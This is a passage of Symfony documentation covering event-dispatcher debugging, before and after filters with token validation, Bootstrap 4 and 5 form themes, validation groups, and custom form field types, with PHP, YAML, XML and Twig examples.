        protected function build(ContainerBuilder $container): void
        {
            $container->addCompilerPass(new AddEventAliasesPass([
                MyCustomEvent::class => 'my_custom_event',
            ]));
        }
    }

The compiler pass will always extend the existing list of aliases. Because of
that, it is safe to register multiple instances of the pass with different
configurations.

Debugging Event Listeners
-------------------------

You can find out what listeners are registered in the event dispatcher
using the console. To show all events and their listeners, run:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher

You can get registered listeners for a particular event by specifying
its name:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel.exception

or can get everything which partial matches the event name:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher kernel // matches "kernel.exception", "kernel.response" etc.
    $ php bin/console debug:event-dispatcher Security // matches "Symfony\Component\Security\Http\Event\CheckPassportEvent"

The :doc:`security </security>` system uses an event dispatcher per
firewall. Use the ``--dispatcher`` option to get the registered listeners
for a particular event dispatcher:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher --dispatcher=security.event_dispatcher.main

.. _event-dispatcher-before-after-filters:

How to Set Up Before and After Filters
--------------------------------------

It is quite common in web application development to need some logic to be
performed right before or directly after your controller actions acting as
filters or hooks.

Some web frameworks define methods like ``preExecute()`` and ``postExecute()``,
but there is no such thing in Symfony. The good news is that there is a much
better way to interfere with the Request -> Response process using the
:doc:`EventDispatcher component </components/event_dispatcher>`.

Token Validation Example
~~~~~~~~~~~~~~~~~~~~~~~~

Imagine that you need to develop an API where some controllers are public
but some others are restricted to one or some clients. For these private features,
you might provide a token to your clients to identify themselves.

So, before executing your controller action, you need to check if the action
is restricted or not. If it is restricted, you need to validate the provided
token.

.. note::

    Please note that for simplicity in this recipe, tokens will be defined
    in config and neither database setup nor authentication via the Security
    component will be used.

Before Filters with the ``kernel.controller`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

First, define some token configuration as parameters:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            tokens:
                client1: pass1
                client2: pass2

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <parameters>
                <parameter key="tokens" type="collection">
                    <parameter key="client1">pass1</parameter>
                    <parameter key="client2">pass2</parameter>
                </parameter>
            </parameters>
        </container>

    .. code-block:: php

        // config/services.php
        $container->setParameter('tokens', [
            'client1' => 'pass1',
            'client2' => 'pass2',
        ]);

Tag Controllers to Be Checked
.............................

A ``kernel.controller`` (aka ``KernelEvents::CONTROLLER``) listener gets notified
on *every* request, right before the controller is executed. So, first, you need
some way to identify if the controller that matches the request needs token validation.

A clean and easy way is to create an empty interface and make the controllers
implement it::

    namespace App\Controller;

    interface TokenAuthenticatedController
    {
        // ...
    }

A controller that implements this interface looks like this::

    namespace App\Controller;

    use App\Controller\TokenAuthenticatedController;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class FooController extends AbstractController implements TokenAuthenticatedController
    {
        // An action that needs authentication
        public function bar(): Response
        {
            // ...
        }
    }

Creating an Event Subscriber
............................

Next, you'll need to create an event subscriber, which will hold the logic
that you want to be executed before your controllers. If you're not familiar with
event subscribers, you can learn more about them at :doc:`/event_dispatcher`::

    // src/EventSubscriber/TokenSubscriber.php
    namespace App\EventSubscriber;

    use App\Controller\TokenAuthenticatedController;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\ControllerEvent;
    use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
    use Symfony\Component\HttpKernel\KernelEvents;

    class TokenSubscriber implements EventSubscriberInterface
    {
        public function __construct(
            private array $tokens
        ) {
        }

        public function onKernelController(ControllerEvent $event): void
        {
            $controller = $event->getController();

            // when a controller class defines multiple action methods, the controller
            // is returned as [$controllerInstance, 'methodName']
            if (is_array($controller)) {
                $controller = $controller[0];
            }

            if ($controller instanceof TokenAuthenticatedController) {
                $token = $event->getRequest()->query->get('token');
                if (!in_array($token, $this->tokens)) {
                    throw new AccessDeniedHttpException('This action needs a valid token!');
                }
            }
        }

        public static function getSubscribedEvents(): array
        {
            return [
                KernelEvents::CONTROLLER => 'onKernelController',
            ];
        }
    }

That's it! Your ``services.yaml`` file should already be setup to load services from
the ``EventSubscriber`` directory. Symfony takes care of the rest. Your
``TokenSubscriber`` ``onKernelController()`` method will be executed on each request.
If the controller that is about to be executed implements ``TokenAuthenticatedController``,
token authentication is applied. This lets you have a "before" filter on any controller
you want.

.. tip::

    If your subscriber is *not* called on each request, double-check that
    you're :ref:`loading services <service-container-services-load-example>` from
    the ``EventSubscriber`` directory and have :ref:`autoconfigure <services-autoconfigure>`
    enabled. You can also manually add the ``kernel.event_subscriber`` tag.

After Filters with the ``kernel.response`` Event
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to having a "hook" that's executed *before* your controller, you
can also add a hook that's executed *after* your controller. For this example,
imagine that you want to add a ``sha1`` hash (with a salt using that token) to
all responses that have passed this token authentication.

Another core Symfony event - called ``kernel.response`` (aka ``KernelEvents::RESPONSE``) -
is notified on every request, but after the controller returns a Response object.
To create an "after" listener, create a listener class and register
it as a service on this event.

For example, take the ``TokenSubscriber`` from the previous example and first
record the authentication token inside the request attributes. This will
serve as a basic flag that this request underwent token authentication::

    public function onKernelController(ControllerEvent $event): void
    {
        // ...

        if ($controller instanceof TokenAuthenticatedController) {
            $token = $event->getRequest()->query->get('token');
            if (!in_array($token, $this->tokens)) {
                throw new AccessDeniedHttpException('This action needs a valid token!');
            }

            // mark the request as having passed token authentication
            $event->getRequest()->attributes->set('auth_token', $token);
        }
    }

Now, configure the subscriber to listen to another event and add ``onKernelResponse()``.
This will look for the ``auth_token`` flag on the request object and set a custom
header on the response if it's found::

    // add the new use statement at the top of your file
    use Symfony\Component\HttpKernel\Event\ResponseEvent;

    public function onKernelResponse(ResponseEvent $event): void
    {
        // check to see if onKernelController marked this as a token "auth'ed" request
        if (!$token = $event->getRequest()->attributes->get('auth_token')) {
            return;
        }

        $response = $event->getResponse();

        // create a hash and set it as a response header
        $hash = sha1($response->getContent().$token);
        $response->headers->set('X-CONTENT-HASH', $hash);
    }

    public static function getSubscribedEvents(): array
    {
        return [
            KernelEvents::CONTROLLER => 'onKernelController',
            KernelEvents::RESPONSE => 'onKernelResponse',
        ];
    }

That's it! The ``TokenSubscriber`` is now notified before every controller is
executed (``onKernelController()``) and after every controller returns a response
(``onKernelResponse()``). By making specific controllers implement the ``TokenAuthenticatedController``
interface, your listener knows which controllers it should take action on.
And by storing a value in the request's "attributes" bag, the ``onKernelResponse()``
method knows to add the extra header. Have fun!

.. _event-dispatcher-method-behavior:

How to Customize a Method Behavior without Using Inheritance
------------------------------------------------------------

If you want to do something right before, or directly after a method is
called, you can dispatch an event respectively at the beginning or at the
end of the method::

    class CustomMailer
    {
        // ...

        public function send(string $subject, string $message): mixed
        {
            // dispatch an event before the method
            $event = new BeforeSendMailEvent($subject, $message);
            $this->dispatcher->dispatch($event, 'mailer.pre_send');

            // get $subject and $message from the event, they may have been modified
            $subject = $event->getSubject();
            $message = $event->getMessage();

            // the real method implementation is here
            $returnValue = ...;

            // do something after the method
            $event = new AfterSendMailEvent($returnValue);
            $this->dispatcher->dispatch($event, 'mailer.post_send');

            return $event->getReturnValue();
        }
    }

In this example, two events are dispatched:

#. ``mailer.pre_send``, before the method is called,
#. and ``mailer.post_send`` after the method is called.

Each uses a custom Event class to communicate information to the listeners
of the two events. For example, ``BeforeSendMailEvent`` might look like
this::

    // src/Event/BeforeSendMailEvent.php
    namespace App\Event;

    use Symfony\Contracts\EventDispatcher\Event;

    class BeforeSendMailEvent extends Event
    {
        public function __construct(
            private string $subject,
            private string $message,
        ) {
        }

        public function getSubject(): string
        {
            return $this->subject;
        }

        public function setSubject(string $subject): string
        {
            $this->subject = $subject;
        }

        public function getMessage(): string
        {
            return $this->message;
        }

        public function setMessage(string $message): void
        {
            $this->message = $message;
        }
    }

And the ``AfterSendMailEvent`` even like this::

    // src/Event/AfterSendMailEvent.php
    namespace App\Event;

    use Symfony\Contracts\EventDispatcher\Event;

    class AfterSendMailEvent extends Event
    {
        public function __construct(
            private mixed $returnValue,
        ) {
        }

        public function getReturnValue(): mixed
        {
            return $this->returnValue;
        }

        public function setReturnValue(mixed $returnValue): void
        {
            $this->returnValue = $returnValue;
        }
    }

Both events allow you to get some information (e.g. ``getMessage()``) and even change
that information (e.g. ``setMessage()``).

Now, you can create an event subscriber to hook into this event. For example, you
could listen to the ``mailer.post_send`` event and change the method's return value::

    // src/EventSubscriber/MailPostSendSubscriber.php
    namespace App\EventSubscriber;

    use App\Event\AfterSendMailEvent;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;

    class MailPostSendSubscriber implements EventSubscriberInterface
    {
        public function onMailerPostSend(AfterSendMailEvent $event): void
        {
            $returnValue = $event->getReturnValue();
            // modify the original $returnValue value

            $event->setReturnValue($returnValue);
        }

        public static function getSubscribedEvents(): array
        {
            return [
                'mailer.post_send' => 'onMailerPostSend',
            ];
        }
    }

That's it! Your subscriber should be called automatically (or read more about
:ref:`event subscriber configuration <ref-event-subscriber-configuration>`).
Bootstrap 4 Form Theme
======================

Symfony provides several ways of integrating Bootstrap into your application. The
most straightforward way is to add the required ``<link>`` and ``<script>``
elements in your templates (usually you only include them in the main layout
template which other templates extend from):

.. code-block:: html+twig

    {# templates/base.html.twig #}

    {# beware that the blocks in your template may be named different #}
    {% block head_css %}
        <!-- Copy CSS from https://getbootstrap.com/docs/4.4/getting-started/introduction/#css -->
    {% endblock %}
    {% block head_js %}
        <!-- Copy JavaScript from https://getbootstrap.com/docs/4.4/getting-started/introduction/#js -->
    {% endblock %}

If your application uses modern front-end practices, it's better to use
:doc:`Webpack Encore </frontend>` and follow :doc:`this tutorial </frontend/encore/bootstrap>`
to import Bootstrap's sources into your SCSS and JavaScript files.

The next step is to configure the Symfony application to use Bootstrap 4 styles
when rendering forms. If you want to apply them to all forms, define this
configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            form_themes: ['bootstrap_4_layout.html.twig']

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:form-theme>bootstrap_4_layout.html.twig</twig:form-theme>
                <!-- ... -->
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->formThemes(['bootstrap_4_layout.html.twig']);

            // ...
        };

If you prefer to apply the Bootstrap styles on a form to form basis, include the
``form_theme`` tag in the templates where those forms are used:

.. code-block:: html+twig

    {# ... #}
    {# this tag only applies to the forms defined in this template #}
    {% form_theme form 'bootstrap_4_layout.html.twig' %}

    {% block body %}
        <h1>User Sign Up:</h1>
        {{ form(form) }}
    {% endblock %}

.. _reference-forms-bootstrap4-error-messages:

Error Messages
--------------

Form errors are rendered **inside** the ``<label>`` element to make sure there
is a strong connection between the error and its ``<input>``, as required by the
`WCAG 2.0 standard`_. To achieve this, ``form_errors()`` is called by
``form_label()`` internally. If you call to ``form_errors()`` in your template,
you'll get the error messages displayed *twice*.

.. tip::

    Since form errors are rendered *inside* the ``<label>``, you cannot use CSS
    ``:after`` to append an asterisk to the label, because it would be displayed
    after the error message. Use the :ref:`label <reference-form-option-label>`
    or :ref:`label_html <reference-form-option-label-html>` options instead.

Checkboxes and Radios
---------------------

For a checkbox/radio field, calling ``form_label()`` doesn't render anything.
Due to Bootstrap internals, the label is already rendered by ``form_widget()``.

File inputs
-----------

File inputs are rendered using the Bootstrap "custom-file" class, which hides
the name of the selected file. To fix that, use the `bs-custom-file-input`_
JavaScript plugin, as recommended by `Bootstrap Forms documentation`_.

Accessibility
-------------

The Bootstrap 4 framework has done a good job making it accessible for functional
variations like impaired vision and cognitive ability. Symfony has taken this one
step further to make sure the form theme complies with the `WCAG 2.0 standard`_.

This does not mean that your entire website automatically complies with the full
standard, but it does mean that you have come far in your work to create a design
for **all** users.

Custom Forms
------------

Bootstrap 4 has a feature called "`custom forms`_". You can enable that on your
Symfony Form ``RadioType`` and ``CheckboxType`` by adding some classes to the label:

* For a `custom radio`_, use ``radio-custom``;
* For a `custom checkbox`_, use ``checkbox-custom``;
* For having a `switch instead of a checkbox`_, use ``switch-custom``.

.. code-block:: twig

    {{ form_row(form.myRadio, {label_attr: {class: 'radio-custom'} }) }}
    {{ form_row(form.myCheckbox, {label_attr: {class: 'checkbox-custom'} }) }}
    {{ form_row(form.myCheckbox, {label_attr: {class: 'switch-custom'} }) }}

.. _`WCAG 2.0 standard`: https://www.w3.org/TR/WCAG20/
.. _`bs-custom-file-input`: https://www.npmjs.com/package/bs-custom-file-input
.. _`Bootstrap Forms documentation`: https://getbootstrap.com/docs/4.4/components/forms/#file-browser
.. _`custom forms`: https://getbootstrap.com/docs/4.4/components/forms/#custom-forms
.. _`custom radio`: https://getbootstrap.com/docs/4.4/components/forms/#radios
.. _`custom checkbox`: https://getbootstrap.com/docs/4.4/components/forms/#checkboxes
.. _`switch instead of a checkbox`: https://getbootstrap.com/docs/4.4/components/forms/#switches
Bootstrap 5 Form Theme
======================

Symfony provides several ways of integrating Bootstrap into your application.
The most straightforward way is to add the required ``<link>`` and ``<script>``
elements in your templates (usually you only include them in the main layout
template which other templates extend from):

.. code-block:: html+twig

    {# templates/base.html.twig #}

    {# beware that the blocks in your template may be named different #}
    {% block stylesheets %}
        <!-- Copy CSS from https://getbootstrap.com/docs/5.0/getting-started/introduction/#css -->
    {% endblock %}
    {% block javascripts %}
        <!-- Copy JavaScript from https://getbootstrap.com/docs/5.0/getting-started/introduction/#js -->
    {% endblock %}

If your application uses modern front-end practices, it's better to use
:doc:`Webpack Encore </frontend>` and follow :doc:`this tutorial </frontend/encore/bootstrap>`
to import Bootstrap's sources into your SCSS and JavaScript files.

The next step is to configure the Symfony application to use Bootstrap 5 styles
when rendering forms. If you want to apply them to all forms, define this
configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            form_themes: ['bootstrap_5_layout.html.twig']

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:form-theme>bootstrap_5_layout.html.twig</twig:form-theme>
                <!-- ... -->
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function(TwigConfig $twig): void {
            $twig->formThemes(['bootstrap_5_layout.html.twig']);

            // ...
        };

If you prefer to apply the Bootstrap styles on a form to form basis, include the
``form_theme`` tag in the templates where those forms are used:

.. code-block:: html+twig

    {# ... #}
    {# this tag only applies to the forms defined in this template #}
    {% form_theme form 'bootstrap_5_layout.html.twig' %}

    {% block body %}
        <h1>User Sign Up:</h1>
        {{ form(form) }}
    {% endblock %}

.. note::

    By default, all inputs are rendered with the ``mb-3`` class on their
    container. If you override the ``row_attr`` class option, the ``mb-3`` will
    be overridden too and you will need to explicitly add it.

.. _reference-forms-bootstrap5-error-messages:

Error Messages
--------------

Unlike in the :doc:`Bootstrap 4 theme </form/bootstrap4>`, errors are rendered
**after** the ``input`` element. However, this still makes a strong connection
between the error and its ``<input>``, as required by the `WCAG 2.0 standard`_.

Checkboxes and Radios
---------------------

For a checkbox/radio field, calling ``form_label()`` doesn't render anything.
Due to Bootstrap internals, the label is already rendered by ``form_widget()``.

Inline Checkboxes and Radios
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you want to render your checkbox or radio fields `inline`_, you can add
the ``checkbox-inline`` or ``radio-inline`` class (depending on your Symfony
Form type or ``ChoiceType`` configuration) to the label class.

.. configuration-block::

    .. code-block:: php

        $builder
            ->add('myCheckbox', CheckboxType::class, [
                'label_attr' => [
                    'class' => 'checkbox-inline',
                ],
            ])
            ->add('myRadio', RadioType::class, [
                'label_attr' => [
                    'class' => 'radio-inline',
                ],
            ]);

    .. code-block:: twig

        {{ form_row(form.myCheckbox, {
            label_attr: {
                class: 'checkbox-inline'
            }
        }) }}

        {{ form_row(form.myRadio, {
            label_attr: {
                class: 'radio-inline'
            }
        }) }}

Switches
~~~~~~~~

Bootstrap 5 allows to render checkboxes as `switches`_. You can enable this
feature on your Symfony Form ``CheckboxType`` by adding the ``checkbox-switch``
class to the label:

.. configuration-block::

    .. code-block:: php

        $builder->add('myCheckbox', CheckboxType::class, [
            'label_attr' => [
                'class' => 'checkbox-switch',
            ],
        ]);

    .. code-block:: twig

        {{ form_row(form.myCheckbox, {
            label_attr: {
                class: 'checkbox-switch'
            }
        }) }}

.. tip::

    You can also render your switches inline by simply adding the
    ``checkbox-inline`` class on the ``label_attr`` option::

        // ...
        'label_attr' => [
            'class' => 'checkbox-inline checkbox-switch',
        ],
        // ...

.. caution::

    Switches only work with **checkbox**.

Input group
-----------

To create `input group`_ in your Symfony Form, simply add the ``input-group``
class to the ``row_attr`` option.

.. configuration-block::

    .. code-block:: php

        $builder->add('email', EmailType::class, [
            'label' => '@',
            'row_attr' => [
                'class' => 'input-group',
            ],
        ]);

    .. code-block:: twig

        {{ form_row(form.email, {
            label: '@',
            row_attr: {
                class: 'input-group'
            }
        }) }}

.. caution::

    If you fill the ``help`` option of your form, it will also be rendered
    as part of the group.

Floating labels
---------------

To render an input field with a `floating label`_, you must add a ``label``,
a ``placeholder`` and the ``form-floating`` class to the ``row_attr`` option
of your form type.

.. configuration-block::

    .. code-block:: php

        $builder->add('name', TextType::class, [
            'label' => 'Name',
            'attr' => [
                'placeholder' => 'Name',
            ],
            'row_attr' => [
                'class' => 'form-floating',
            ],
        ]);

    .. code-block:: twig

        {{ form_row(form.name, {
            label: 'Name',
            attr: {
                placeholder: 'Name'
            },
            row_attr: {
                class: 'form-floating'
            }
        }) }}

.. caution::

    You **must** provide a ``label`` and a ``placeholder`` to make floating
    labels work properly.

Accessibility
-------------

The Bootstrap 5 framework has done a good job making it accessible for
functional variations like impaired vision and cognitive ability. Symfony has
taken this one step further to make sure the form theme complies with the
`WCAG 2.0 standard`_.

This does not mean that your entire website automatically complies with the full
standard, but it does mean that you have come far in your work to create a
design for **all** users.

.. _`WCAG 2.0 standard`: https://www.w3.org/TR/WCAG20/
.. _`inline`: https://getbootstrap.com/docs/5.0/forms/checks-radios/#inline
.. _`switches`: https://getbootstrap.com/docs/5.0/forms/checks-radios/#switches
.. _`input group`: https://getbootstrap.com/docs/5.0/forms/input-group/
.. _`floating label`: https://getbootstrap.com/docs/5.0/forms/floating-labels/
How to Choose Validation Groups Based on the Clicked Button
===========================================================

When your form contains multiple submit buttons, you can change the validation
group depending on which button is used to submit the form. For example,
consider a form in a wizard that lets you advance to the next step or go back
to the previous step. Also assume that when returning to the previous step,
the data of the form should be saved, but not validated.

First, we need to add the two buttons to the form::

    $form = $this->createFormBuilder($task)
        // ...
        ->add('nextStep', SubmitType::class)
        ->add('previousStep', SubmitType::class)
        ->getForm();

Then, we configure the button for returning to the previous step to run
specific validation groups. In this example, we want it to suppress validation,
so we set its ``validation_groups`` option to false::

    $form = $this->createFormBuilder($task)
        // ...
        ->add('previousStep', SubmitType::class, [
            'validation_groups' => false,
        ])
        ->getForm();

Now the form will skip your validation constraints. It will still validate
basic integrity constraints, such as checking whether an uploaded file was too
large or whether you tried to submit text in a number field.

.. seealso::

    To see how to use a service to resolve ``validation_groups`` dynamically
    read the :doc:`/form/validation_group_service_resolver` article.
How to Create a Custom Form Field Type
======================================

Symfony comes with :doc:`tens of form types </reference/forms/types>` (called
"form fields" in other projects) ready to use in your applications. However,
it's common to create custom form types to solve specific purposes in your
projects.

Creating Form Types Based on Symfony Built-in Types
---------------------------------------------------

The easiest way to create a form type is to base it on one of the
:doc:`existing form types </reference/forms/types>`. Imagine that your project
displays a list of "shipping options" as a ``<select>`` HTML element. This can
be implemented with a :doc:`ChoiceType </reference/forms/types/choice>` where the
``choices`` option is set to the list of available shipping options.

However, if you use the same form type in several forms, repeating the list of
``choices`` every time you use it quickly becomes boring. In this example, a
better solution is to create a custom form type based on ``ChoiceType``. The
custom type looks and behaves like a ``ChoiceType`` but the list of choices is
already populated with the shipping options so you don't need to define them.

Form types are PHP classes that implement :class:`Symfony\\Component\\Form\\FormTypeInterface`,
but you should instead extend from :class:`Symfony\\Component\\Form\\AbstractType`,
which already implements that interface and provides some utilities.
By convention they are stored in the ``src/Form/Type/`` directory::

    // src/Form/Type/ShippingType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\ChoiceType;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class ShippingType extends AbstractType
    {
        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'choices' => [
                    'Standard Shipping' => 'standard',
                    'Expedited Shipping' => 'expedited',
                    'Priority Shipping' => 'priority',
                ],
            ]);
        }

        public function getParent(): string
        {
            return ChoiceType::class;
        }
    }

``getParent()`` tells Symfony to take ``ChoiceType`` as a starting point,
then ``configureOptions()`` overrides some of its options. (All methods of the
``FormTypeInterface`` are explained in detail later in this article.)
The resulting form type is a choice field with predefined choices.

Now you can add this form type when :doc:`creating Symfony forms </forms>`::

    // src/Form/Type/OrderType.php
    namespace App\Form\Type;

    use App\Form\Type\ShippingType;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\FormBuilderInterface;

    class OrderType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                // ...
                ->add('shipping', ShippingType::class)
            ;
        }

        // ...
    }

That's all. The ``shipping`` form field will be rendered correctly in any
template because it reuses the templating logic defined by its parent type
``ChoiceType``. If you prefer, you can also define a template for your custom
types, as explained later in this article.

Creating Form Types Created From Scratch
----------------------------------------

Some form types are so specific to your projects that they cannot be based on
any :doc:`existing form types </reference/forms/types>` because they are too
different. Consider an application that wants to reuse in different forms the
following set of fields as the "postal address":

.. raw:: html

    <object data="../_images/form/form-custom-type-postal-address.svg" type="image/svg+xml"
        alt="A wireframe of the custom field type, showing five text inputs: two address lines, the City, the State and the ZIP code."
    ></object>

As explained above, form types are PHP classes that implement
:class:`Symfony\\Component\\Form\\FormTypeInterface`, although it's more
convenient to extend instead from :class:`Symfony\\Component\\Form\\AbstractType`::

    // src/Form/Type/PostalAddressType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\FormType;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class PostalAddressType extends AbstractType
    {
        // ...
    }

These are the most important methods that a form type class can define:

.. _form-type-methods-explanation:

``getParent()``
    If your custom type is based on another type (i.e. they share some
    functionality), add this method to return the fully-qualified class name
    of that original type. Do not use PHP inheritance for this.
    Symfony will call all the form type methods (``buildForm()``,
    ``buildView()``, etc.) and type extensions of the parent before
    calling the ones defined in your custom type.

    Otherwise, if your custom type is build from scratch, you can omit ``getParent()``.

    By default, the ``AbstractType`` class returns the generic
    :class:`Symfony\\Component\\Form\\Extension\\Core\\Type\\FormType`
    type, which is the root parent for all form types in the Form component.

``configureOptions()``
    It defines the options configurable when using the form type, which are also
    the options that can be used in the following methods. Options are inherited
    from parent types and parent type extensions, but you can create any custom
    option you need.

``buildForm()``
    It configures the current form and may add nested fields. It's the same
    method used when
    :ref:`creating Symfony form classes <creating-forms-in-classes>`.

``buildView()``
    It sets any extra variables you'll need when rendering the field in a form
    theme template.

``finishView()``
    Same as ``buildView()``. This is useful only if your form type consists of
    many fields (i.e. A ``ChoiceType`` composed of many radio or checkboxes),
    as this method will allow accessing child views with
    ``$view['child_name']``. For any other use case, it's recommended to use
    ``buildView()`` instead.

Defining the Form Type
~~~~~~~~~~~~~~~~~~~~~~

Start by adding the ``buildForm()`` method to configure all the types included
in the postal address. For the moment, all fields are of type ``TextType``::

    // src/Form/Type/PostalAddressType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    class PostalAddressType extends AbstractType
    {
        // ...

        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('addressLine1', TextType::class, [
                    'help' => 'Street address, P.O. box, company name',
                ])
                ->add('addressLine2', TextType::class, [
                    'help' => 'Apartment, suite, unit, building, floor',
                ])
                ->add('city', TextType::class)
                ->add('state', TextType::class, [
                    'label' => 'State',
                ])
                ->add('zipCode', TextType::class, [
                    'label' => 'ZIP Code',
                ])
            ;
        }
    }

.. tip::

    Run the following command to verify that the form type was successfully
    registered in the application:

    .. code-block:: terminal

        $ php bin/console debug:form

This form type is ready to use it inside other forms and all its fields will be
correctly rendered in any template::

    // src/Form/Type/OrderType.php
    namespace App\Form\Type;

    use App\Form\Type\PostalAddressType;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\FormBuilderInterface;

    class OrderType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                // ...
                ->add('address', PostalAddressType::class)
            ;
        }

        // ...
    }

However, the real power of custom form types is achieved with custom form
options (to make them flexible) and with custom templates (to make them look
better).

.. _form-type-config-options:

Adding Configuration Options for the Form Type
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Imagine that your project requires to make the ``PostalAddressType``
configurable in two ways:

* In addition to "address line 1" and "address line 2", some addresses should be
  allowed to display an "address line 3" to store extended address information;
* Instead of displaying a free text input, some addresses should be able to
  restrict the possible states to a given list.

This is solved with "form type options", which allow to configure the behavior
of the form types. The options are defined in the ``configureOptions()`` method
and you can use all the :doc:`OptionsResolver component features </components/options_resolver>`
to define, validate and process their values::

    // src/Form/Type/PostalAddressType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\OptionsResolver\Options;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class PostalAddressType extends AbstractType
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // this defines the available options and their default values when
            // they are not configured explicitly when using the form type
            $resolver->setDefaults([
                'allowed_states' => null,
                'is_extended_address' => false,
            ]);

            // optionally you can also restrict the options type or types (to get
            // automatic type validation and useful error messages for end users)
            $resolver->setAllowedTypes('allowed_states', ['null', 'string', 'array']);
            $resolver->setAllowedTypes('is_extended_address', 'bool');

            // optionally you can transform the given values for the options to
            // simplify the further processing of those options
            $resolver->setNormalizer('allowed_states', static function (Options $options, $states): ?array
            {
                if (null === $states) {
                    return $states;
                }

                if (is_string($states)) {
                    $states = (array) $states;
                }

                return array_combine(array_values($states), array_values($states));
            });
        }
    }

Now you can configure these options when using the form type::

    // src/Form/Type/OrderType.php
    namespace App\Form\Type;

    // ...

    class OrderType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                // ...
                ->add('address', PostalAddressType::class, [
                    'is_extended_address' => true,
                    'allowed_states' => ['CA', 'FL', 'TX'],
                    // in this example, this config would also be valid:
                    // 'allowed_states' => 'CA',
                ])
            ;
        }

        // ...
    }

The last step is to use these options when building the form::

    // src/Form/Type/PostalAddressType.php
    namespace App\Form\Type;

    // ...

    class PostalAddressType extends AbstractType
    {
        // ...

        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            // ...

            if (true === $options['is_extended_address']) {
                $builder->add('addressLine3', TextType::class, [
                    'help' => 'Extended address info',
                ]);
            }

            if (null !== $options['allowed_states']) {
                $builder->add('state', ChoiceType::class, [
                    'choices' => $options['allowed_states'],
                ]);
            } else {
                $builder->add('state', TextType::class, [
                    'label' => 'State/Province/Region',
                ]);
            }
        }
    }

Creating the Form Type Template
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, custom form types will be rendered using the
:doc:`form themes </form/form_themes>` configured in the application. However,
for some types you may prefer to create a custom template in order to customize
how they look or their HTML structure.

First, create a new Twig template anywhere in the application to store the
fragments used to render the types:

.. code-block:: twig

    {# templates/form/custom_types.html.twig #}

    {# ... here you will add the Twig code ... #}

Then, update the :ref:`form_themes option <config-twig-form-themes>` to
add this new template at the end of the list (each theme overrides all the previous ones):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            form_themes:
                - '...'
                - 'form/custom_types.html.twig'

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
